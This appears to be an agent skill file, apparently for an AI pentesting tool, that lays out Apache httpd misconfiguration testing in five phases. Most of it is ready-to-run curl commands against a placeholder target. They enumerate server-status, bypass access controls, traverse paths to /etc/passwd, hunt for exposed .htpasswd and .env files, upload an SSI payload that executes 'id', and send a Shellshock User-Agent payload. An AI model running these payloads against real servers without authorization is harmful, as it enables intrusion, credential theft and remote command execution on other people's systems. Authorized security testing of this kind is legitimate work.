---
name: tech-apache-misconfig
description: "Apache httpd misconfiguration testing — .htaccess bypass, mod_status, directory listing, server-info, TRACE method, Optionsbleed, path traversal via Alias. Triggers: 'apache misconfig', 'apache security', 'apache pentest', 'htaccess bypass', 'mod_status', 'apache directory listing'."
---

# Apache Misconfiguration Testing

Identify and exploit Apache httpd configuration weaknesses.

## Phase 1: Information Disclosure

```bash
TARGET="https://TARGET"

curl -s "$TARGET/server-status" | head -50
curl -s "$TARGET/server-info" | grep -E "version|module|config"

curl -s -X OPTIONS "$TARGET" -I | grep Allow
curl -s -X TRACE "$TARGET" -d "test=data" -I

curl -s -I "$TARGET" | grep -E "Server:|X-Powered-By:"

for dir in /uploads /backup /admin /logs /tmp /files /assets /images; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$dir/")
  echo "$code $dir"
done
```

## Phase 2: .htaccess and Access Control Bypass

```bash
curl "$TARGET/Admin"
curl "$TARGET/ADMIN"

curl "$TARGET/admin."
curl "$TARGET/admin/"
curl "$TARGET/admin/."
curl "$TARGET/./admin/"

curl "$TARGET/%61dmin"    # 'a' encoded
curl "$TARGET/adm%69n"    # 'i' encoded

curl "$TARGET/static/../../../etc/passwd"

curl "$TARGET/admin%2F"
curl "$TARGET//admin/"
```

## Phase 3: mod_userdir Exposure

```bash
for user in admin root www-data apache ubuntu; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/~$user/")
  echo "$code /~$user/"
done

# 403 = user exists but no public_html, 404 = user doesn't exist
```

## Phase 4: Configuration File Exposure

```bash
for file in .htaccess .htpasswd web.config .env .DS_Store robots.txt \
            phpinfo.php test.php info.php backup.php; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file")
  [ "$code" != "404" ] && echo "$code $file"
done

for ext in .bak .old .orig .backup .copy .temp ~; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/index.php$ext")
  [ "$code" != "404" ] && echo "$code index.php$ext"
done

nuclei -u "$TARGET" -t apache/ -t misconfiguration/ -o /workspace/output/apache-nuclei.txt
```

## Phase 5: SSI / CGI Abuse

```bash
curl -X POST "$TARGET/upload" -F "file=@/dev/stdin;filename=test.shtml" \
  <<< '<!--#exec cmd="id"-->'

curl "$TARGET/cgi-bin/test.sh"
curl "$TARGET/cgi-bin/"

curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" "$TARGET/cgi-bin/test.cgi"
```

## Output

Save to `/workspace/output/`:
- `apache-info.txt` — server version, modules, config
- `apache-open-paths.txt` — accessible dirs and files
- `apache-nuclei.txt` — automated scan results

## Next Phase

→ `vuln-path-traversal` for deeper traversal testing
→ `vuln-ssrf` if proxy_pass configurations found
